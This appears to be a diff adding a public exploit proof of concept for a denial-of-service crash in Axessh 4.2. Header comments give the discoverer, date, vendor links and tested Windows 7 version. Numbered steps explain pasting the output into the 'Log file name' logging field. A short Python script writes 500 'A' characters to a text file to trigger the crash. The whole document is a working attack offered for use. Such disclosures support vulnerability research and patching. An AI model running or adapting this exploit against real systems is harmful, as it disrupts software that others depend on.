@@ -1,0 +1,23 @@
+#Exploit Title: Axessh 4.2 'Log file name' - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-14
+#Vendor Homepage: http://www.labf.com
+#Software Link: http://www.labf.com/download/axessh.exe
+#Tested Version: 4.2
+#Tested on: Windows 7 Service Pack 1 x32
+
+#Steps to produce the crash:
+#1.- Run python code: Axessh_4.2.py
+#2.- Open Axess.txt and copy content to clipboard
+#3.- Open Axessh.exe
+#4.- In "Telnet Connect Host" select "Details>>" > "Settings"
+#5.- Select "Logging" and enable "Log all sessions output"
+#6.- In "Log file name" paste Clipboard
+#7.- Select "OK" and in "Telnet Connect Host" select "Ok"
+#8.- Crashed
+
+cod = "\x41" * 500
+
+f = open('Axess.txt', 'w')
+f.write(cod)
+f.close()
